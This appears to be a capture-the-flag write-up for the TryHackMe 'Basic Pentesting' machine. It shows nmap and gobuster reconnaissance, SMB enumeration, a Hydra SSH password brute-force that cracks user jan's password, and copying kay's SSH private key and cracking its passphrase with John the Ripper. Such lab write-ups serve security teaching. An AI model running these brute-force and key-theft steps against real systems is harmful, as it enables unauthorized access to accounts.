[![Needed-nmap](https://img.shields.io/badge/Needed-nmap-blue)](https://nmap.org/)
[![Needed-Gobuster](https://img.shields.io/badge/Needed-Gobuster-orange)](https://github.com/OJ/gobuster)
[![Needed-Hydra](https://img.shields.io/badge/Needed-Hydra-green)](https://github.com/vanhauser-thc/thc-hydra)
[![Needed-John](https://img.shields.io/badge/Needed-John-red)](https://github.com/openwall/john)
[![Needed-enum4linux](https://img.shields.io/badge/Needed-enum4linux-yellow)](https://github.com/CiscoCXSecurity/enum4linux)

# Basic Pentesting

## Reconnaissance
First step is to find the services exposed on the vulnerable machine. Running `nmap` with option `-sS` we get nothing, hence the machine probably ignores ICMP. We try to run the command again with `-Pn` option:
```
┌──(marco㉿DellMarco)-[/mnt/f/kali]
└─$ sudo nmap -Pn -sS -sV 10.10.147.42
Nmap scan report for 10.10.147.42
Host is up (0.33s latency).

PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http        Apache httpd 2.4.18 ((Ubuntu))
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
8009/tcp open  ajp13       Apache Jserv (Protocol v1.3)
8080/tcp open  http        Apache Tomcat 9.0.7
Service Info: Host: BASIC2; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

By visiting it on the browser, we can see that on port 80 there's a maintainance page, and on port 8080 a Tomcat instance.

## Enumeration
On port 8080 we can't see any public subdirectory, so we can bruteforce it with gobuster. Unfortunately we can't see nothing useful on this port, so we try on port 80:
```
┌──(marco㉿DellMarco)-[/mnt/f/kali]
└─$ gobuster -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt dir -u http://10.10.147.42:80
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.147.42:80
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2022/03/17 00:49:37 Starting gobuster in directory enumeration mode
===============================================================
/development          (Status: 301) [Size: 318] [--> http://10.10.147.42/development/]
...
```

On this port gobuster just found `/development` directory with two files.

### dev.txt
```
2018-04-23: I've been messing with that struts stuff, and it's pretty cool! I think it might be neat
to host that on this server too. Haven't made any real web apps yet, but I have tried that example
you get to show off how it works (and it's the REST version of the example!). Oh, and right now I'm 
using version 2.5.12, because other versions were giving me trouble. -K

2018-04-22: SMB has been configured. -K

2018-04-21: I got Apache set up. Will put in our content later. -J
```

### j.txt
```
For J:

I've been auditing the contents of /etc/shadow to make sure we don't have any weak credentials,
and I was able to crack your hash really easily. You know our password policy, so please follow
it? Change that password ASAP.

-K
```

### Deductions
1) SMB is configured
2) There's a REST app in a vulnerable version of Apache Struts
3) J has a weak password -> easily crackable

### SMB port
#### Shares
The present shares can be seen with an `smb-enum-shares.nse`. In this case we can find `anonymous` and `BASIC2`.<br>
Anonymous doesn't have a password, so we can access it and see the file `staff.txt`:
```
Announcement to staff:

PLEASE do not upload non-work-related items to this share. I know it's all in fun, but
this is how mistakes happen. (This means you too, Jan!)

-Kay
```

#### Local users
With the tool `enum4linux` we can enumerate the SMB port to get the machine users:
```
┌──(marco㉿DellMarco)-[/mnt/f/kali]
└─$ enum4linux -a 10.10.204.37
...
S-1-22-1-1000 Unix User\kay (Local User)
S-1-22-1-1001 Unix User\jan (Local User)
...
```

Now  we have a confirmation of the two accounts Kay and Jan!

## Password cracking
Knowing that Jan has a weak password, we can try to bruteforce it with Hydra. In fact we cracked the password in some minute with:
```
┌──(marco㉿DellMarco)-[/mnt/f/kali/TryHackMe/Basic_Pentesting]
└─$ hydra -f -t 4 -l jan -P /usr/share/wordlists/rockyou.txt ssh://10.10.151.11
...
[DATA] max 4 tasks per 1 server, overall 4 tasks, 14344399 login tries (l:1/p:14344399), ~3586100 tries per task
[DATA] attacking ssh://10.10.151.11:22/
[STATUS] ...
[22][ssh] host: 10.10.151.11   login: jan   password: armando
[STATUS] attack finished for 10.10.151.11 (valid pair found)
1 of 1 target successfully completed, 1 valid password found
...
```

Now we can access jan's account through ssh.

## Privilege escalation
After the access we notice that Jan's home is empty, except for an unaccessible hidden file, so we start to look for other users (a.k.a. Kay). We cannot access Kay's files in `/home/kay`, but somehow we can access Kay's SSH keys in `~/.ssh/`.<br>
After copying the keys we try to access Kay's account, but the machine asks for a passphrase... Let's crack it!

### Passphrase crack
To crack the passphrase the first step is to get the hash from the private key with the command `ssh2john id_rsa_kay > hashes.hash`.<br>
Now we need to crack the hash with John the ripper:
```
┌──(marco㉿DellMarco)-[/mnt/f/kali/TryHackMe/Basic_Pentesting]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt hashes.hash
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 8 OpenMP threads
beeswax          (id_rsa_kay)
1g 0:00:00:00 DONE (2022-03-17 16:55) 25.00g/s 2068Kp/s 2068Kc/s 2068KC/s bird..bammer
Session completed.
```

Now we can get in using ssh key and the passphrase `beeswax`. On Kay's home there's the flag file `pass.bak`